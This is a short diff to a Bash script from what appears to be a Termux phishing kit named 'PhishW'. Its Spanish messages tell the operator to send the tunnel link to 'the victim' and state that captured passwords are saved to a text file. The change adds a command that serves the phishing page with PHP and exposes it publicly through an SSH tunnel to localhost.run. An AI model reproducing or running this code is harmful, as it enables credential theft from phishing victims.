@@ -110,12 +110,10 @@ cd /data/data/com.termux/files/home/PhishW
 setterm -foreground cyan
 echo ""
 echo "localhost:$b abierto "
-echo "Haga un tunel con ngrok o ssh"
-echo "Enviale el link del túnel a la victima"
 echo "La Contraseña se guarda en el archivo txt"
+echo "Enviale el link del túnel a la victima"
 echo ""
-php -S 0.0.0.0:$b
-#
+php -S 0.0.0.0:$b & ssh -R 80:localhost:$b nokey@localhost.run -q
 ;;
 2)
 #! /bin/bash
